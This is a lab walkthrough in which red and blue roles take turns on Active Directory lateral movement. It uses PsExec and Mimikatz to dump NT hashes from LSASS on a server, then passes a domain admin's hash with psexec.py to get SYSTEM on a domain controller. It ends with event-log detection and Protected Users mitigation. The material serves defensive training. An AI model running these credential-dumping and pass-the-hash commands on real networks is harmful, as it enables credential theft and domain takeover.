psexec.exe \\SRV01 cmd.exe -accepteula

mimikatz.exe
privilege::debug
sekurlsa::msv

python.exe psexec.py -hashes :e9cea451b61bd792681893d48f9683b9 CONTOSO/v.fergusson.adm@192.168.1.11 cmd.exe
This opens a command prompt on 192.168.1.11 (aka **DC01**) and we used to hash of Vickie during the logon process.

### Extract the hash from the LSASS memory 
	▪  This requires the seDebugPrivilege 
	▪ Requires that the targeted identity has cached its credentials 
### Inject the hash into your current session 
	▪ Either locally, or later on other systems 
	▪ The “new” hash is used to calculate NTLM responses 
### Does not trigger any failed authentication attempts

Attack’s pre-requisites - A victim is connected to the system, or a service is running under a user account - seDebugPrivilege, or LSASS memory dump

Protection - Healthy administration practices (do not connect to untrusted systems with privileged accounts, use RDP restricted mode) - Use the Protected Users group (for privileged accounts) - Block NTLM on systems where it is not used (very difficult in large environments)

(ING) LAB 4 - Lateral movement

4 Hours Remaining

Instructions Resources Help  100%

## Exercise 2 - Perform a pass-the-hash attack

Well done **Miss Red**, now that you control **Connie**, a domain user member of the local administrators of **SRV01**, you own **SRV01** and all the accounts connected to it.

### Task 1 - Extract credentials from SRV01

Let's check if there is something yummy to steal (well, we know there is because we connected with Vickie's admin account to SRV01 at the beginning of this lab).

1. We are still on **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\red`|
    |Password|`NeverTrustAny1!`|
    
2. You should still have a **Windows Terminal** window open. If that's not the case, open one by right clicking on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127288/11menu.png) and clicking on **Windows Terminal (Admin)**.
    
3. In the **Windows Terminal** window, run the following: `runas /user:connie.flores@contoso.com cmd.exe` and use the following password `NeverTrustAny1!`.
    
    > The password will not show in the prompt. Once you have clicked on the ![ntw2poa5.jpg](https://labondemand.blob.core.windows.net/content/lab127288/ntw2poa5.jpg) in front of the password, hit the Enter key to validate the input.
    
4. To avoid confusion, you are going to change the color of that new prompt. Make sure you have the cmd.exe (running as connie.flores@contoso.com) open and in focus, then run `color 4F & title Connie CMD` This is what your window with Connie.Flores should look like: ![REDC2.png](https://labondemand.blob.core.windows.net/content/lab127288/REDC2.png) Note that not only we changed the color, but we also have given the window a new title **Connie CMD**.
    
    We are going to run credential theft tools on **SRV01**.
    
5. In from the **Connie CMD** window, run the following command `cd \Tools\PStools` then run `psexec.exe \\SRV01 cmd.exe -accepteula`
    
    ⌚ The might take a little while (about30 seconds).
    
    Note that the title of the console is now **\\SRV01: cmd.exe**
    
6. Run the following command `hostname`. It will tell you to which system you are connected.
    
    Let's list the connected users.
    
7. Run the following command `query user`.
    
    📝 What is the SESSIONNAME of Vickie Fergusson's admin account?
    
    Let's extract Vickie's NT Hash.
    
8. Still from the **\\SRV01: cmd.exe** window, run the following command `cd \Tools\mimikatz` then run `mimikatz.exe`.
    
9. In the **mimikatz #** prompt, take the seDebugPrivilege to be able to read the memory: `privilege::debug` then run the following command to extract the NT hashes from the memory: `sekurlsa::msv`. Scroll up until the see the following: ![MIMI1.png](https://labondemand.blob.core.windows.net/content/lab127288/MIMI1.png) Vickey's hash is displayed in the **NTLM** proprety.
    
    📝 What is the NT Hash of Vickie Fergusson's admin account?
    

Congrats **Miss Red**! You got your hands on Vickie's admin account. And Vickie is a domain admin… It smells very good 🌷

### Task 2 - Pass the hash of Vickie while connecting to a domain controller

Congratulation on getting a domain admin's hash **Miss Red**. Now it's time to use it.

1. We are still on **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\red`|
    |Password|`NeverTrustAny1!`|
    
2. Switch to your **Windows Terminal** console. If you closed it, open a new one by right clicking on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127288/11menu.png) and clicking on **Windows Terminal (Admin)**.
    
3. In the **Windows Terminal** window, run the following `cd \Tools\Scripts`. Then run the following command: `python.exe psexec.py -hashes :e9cea451b61bd792681893d48f9683b9 CONTOSO/v.fergusson.adm@192.168.1.11 cmd.exe` This opens a command prompt on 192.168.1.11 (aka **DC01**) and we used to hash of Vickie during the logon process.
    
4. To confirm we are on **DC01**, run `hostname` and to see who we are on this system, run `whoami`. You should have these results: ![PSEXECPY.png](https://labondemand.blob.core.windows.net/content/lab127288/PSEXECPY.png)
    
    Congratulation **Miss Red** you are SYSTEM on a domain controller without knowing the password of an admin, but by knowing (and using) only the hash. **You passed the hash.** Let's tell **Mister Blue** about it.
    
5. In the same prompt run `exit` to exit the PsExec session. ![dptqeqnc.png](https://labondemand.blob.core.windows.net/content/lab127288/dptqeqnc.png)
    

### Task 3 - Check the traces on the domain controller

Welcome back **Mister Blue**. It seems that **Miss Red** owns an admin account and is SYSTEM on your favorite domain controller. The one you swear to protect when you where hired… Let's see what we can see of that recent pass-the-hash.

1. Log on to **[DC01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)**. Use the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Event Viewer**.
    
3. In the **Event Viewer** window, navigate to **Event Viewer (Local)** > **Windows Logs** > **Security**.
    
4. On the **Actions** pane, click again on **Filter Current Log…**. In the **Filter Current Log** window, select the **XML** tab and click the **Edit query manually** check box. Acknowledge the pop-up by clicking **Yes**.
    
5. Select the XML filter in the window and delete it.
    
6. Type the following filter instead: `<QueryList> <Query Id="0" Path="Security"> <Select Path="Security"> Event[ System[ (EventID=4624) or (EventID=4776) ] and EventData[ Data[@Name="TargetUserName"]="v.fergusson.adm" ] ] </Select> </Query> </QueryList>` And click **OK**.
    
7. Double click on the latest successful event **4776**. It should look like this: ![4776PY.png](https://labondemand.blob.core.windows.net/content/lab127288/4776PY.png)
    
    📝 What does error code 0x0 means in this context?
    
    You notice that the Source Workstation is empty.
    
    ❓ Why is the Source Workstation property empty in the event 4776? **Click here to see the answer**.
    
8. Double click on the latest succesful event **4624**. You can see the actual IP address of **CLI01** in that entry.
    
    📝 What is the Authentication Package in the event 4624?
    

You can see why the **Pass-The-Hash** type of attack is tough to detect just looking at the logs. It just look like a legit connection. You need to make this attack less easy…

0% Tasks Complete

PreviousNext: Exercise 3 - Reduce...

Live Chat



(ING) LAB 4 - Lateral movement

4 Hours Remaining

Instructions Resources Help  100%

## Exercise 3 - Reduce NT Hash exposure

Alright **Mister Blue**. As soon as SRV01 was owned, all the accounts caching their creds in it were at risk. How can we reduce that NT Hash exposure on a system.

### Task 1 - Leverage the Protected Users group

To take full advantage of the Protected Users group protection, the domain functional level needs to be at least Windows Server 2012 R2. Let's see if that's the case for us.

1. Log on to **[DC01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)**. Use the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
3. In the **Run** window, type `dsa.msc` then click **OK**.
    
4. In the **Active Directory Users and Computers** console, right click on the domain **contoso.com** and click **Properties**. You should see that the current level is 2008 R2. Not great. Let's change that. Click **OK** to close the domain properties window.
    
5. Still in the **Active Directory Users and Computers** console, right click on the domain **contoso.com** and click **Raise domain functional level…**. From the drop-down menu, select **Windows Server 2016** and click **Raise**. A pop-up asks you to confirm the operation, click **OK**. And **OK** again in the next confirmation pop-up.
    
6. Now browse the domain, click on the organizational unit **_Admins**, right click on the **Vickie Fergusson Adm** account click **All Tasks** and then **Add to a group…**.
    
7. In the **Select Groups** window, type `Protected Users`, then click **Check Names** and click **OK**. Click **OK** in the confirmation pop-up.
    
    This will block the usage of NTLM on this account. That's okay because she is an admin. Blocking NTLM on a regular account is very tricky as you will need to understand all possible dependencies with the applications and systems used by a user. Let's also enable some logs for visibility.
    
8. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Event Viewer**.
    
9. In the Event Viewer window, navigate to **Event Viewer (Local)** > **Applications and Services Logs** > **Microsoft** > **Windows** > **Authentication**.
    
10. Right click on the **ProtectedUserFailures-DomainController** and select **Enable Log**. Do the same things for the **ProtectedUserSuccesses-DomainController**. Now we will see the failures and successes for the members of the **Protected Users** group on a separate event log.
    

Let's ask **Miss Red** to pass-the-hash again.

### Task 2 - Try to pass-the-hash again

Hello back **Miss Red**. It seems that things have changed, and that Vickie's account might not be usable with NTLM. Let's see if that's really the case.

1. Let's connect on **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\red`|
    |Password|`NeverTrustAny1!`|
    
2. You should still have a **Windows Terminal** window opened. If that's not the case, open one by right clicking on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127288/11menu.png) and clicking on **Windows Terminal (Admin)**.
    
3. In the **Windows Terminal** window, run the following `cd \Tools\Scripts`. Then run the following command: `python.exe psexec.py -hashes :e9cea451b61bd792681893d48f9683b9 CONTOSO/v.fergusson.adm@192.168.1.21 cmd.exe` This time we are trying to open a command prompt on 192.168.1.21 (aka **SRV01**) just for a change.
    
    📝 What is the SessionError code?
    

Knowing the hash of Vickie's account is not enough to try to impersonate her. At least not by using NTML.

### Task 3 - Check the traces

Good job **Mister Blue**. It seems the attack now fails. Let's check the traces it left on the domain controller.

1. Log on to **[DC01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)**. Use the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
2. If you do not have an **Event Viewer** window, right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Event Viewer**.
    
3. In the **Event Viewer** window, navigate to **Event Viewer (Local)** > **Applications and Services Logs** > **Microsoft** > **Windows** > **Authentication** > **ProtectedUserFailures-DomainController**. You should see the following event: ![EVT100.png](https://labondemand.blob.core.windows.net/content/lab127288/EVT100.png)
    
    📝 What is the Event ID?
    
    You see the **Device Name** is **(NULL)**. It also means that if you check the event **4776** on the **Security** logs you would also see an empty **User Workstation** property. Let's check if we can identify the server against which the hash was tried.
    
4. In the **Event Viewer** window, navigate to **Event Viewer (Local)** > **Applications and Services Logs** > **Microsoft** > **Windows** > **NTLM** > **Operational**. You should see the following event **8004**:  
    ![NTLM8004-2.png](https://labondemand.blob.core.windows.net/content/lab127288/NTLM8004-2.png)
    

Well that's good. You made the usage of that NT Hash a bit less relevant… But it would have been nice that this hash not be stored in the memory in the first place. Let's see how to achieve that.

### Task 4 - Connect to a system when you are a Protected Users member

Let's see what happens if Vickies "RDPes" to server while being a member of the Protected Users group.

Let's kill all active session on **SRV01**, we are going to reboot the server to make it easier.

1. Connect on to **[SRV01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** using the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png), click on **Shut down and sign out** then click **Restart**.
    
3. In the confirmation popup, select **Other (Unplanned)** and click **Continue**.
    
    If you get a confirmation pop-up, click **Restart anyway**.
    
4. Log on to **[DC02](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)**. Use the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\v.fergusson.adm`|
    |Password|`NeverTrustAny1!`|
    
5. At this point your Remote Desktop session establised with **SRV01** should have dropped. We are going to establish another one.
    
6. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
7. In the **Run** window type `mstsc.exe` and click **OK**.
    
8. In the **Remote Desktop Connection** window, in the **Computer** field type `SRV01` and click **Connect**. You should be prompted to enter a password, use this password `NeverTrustAny1!` and click **OK**.
    
9. In the **srv01** session window, right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Windows PowerShell (Admin)**.
    
10. In **Windows PowerShell** prompt, run the following command `cd \Tools\mimikatz` then run `mimikatz.exe`.
    
11. In the **mimikatz #** prompt, take the seDebugPrivilege to be able to read the memory: `privilege::debug` then run the following command to extract the NT hashes from the memory: `sekurlsa::msv`. Scroll all the way up the output you should see the following: ![MIMI3.png](https://labondemand.blob.core.windows.net/content/lab127288/MIMI3.png)
    
    You can see that there is no NTLM property available for Vickie's session.
    
12. Close the **mimikatz 2.2.0 x64 (oe.eo)** window.
    
13. Close the RDP session open (without signing out) by clicking on the X on the blue ribbon on the top of the screen: ![xqx8k97k.png](https://labondemand.blob.core.windows.net/content/lab127288/xqx8k97k.png)
    
14. Sign-out Vickie from the session by right clicking on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png), clicking **Shut down or sign out** and select **Sign out**.
    

0% Tasks Complete

PreviousNext: Exercise 4 - Perform...

Live Chat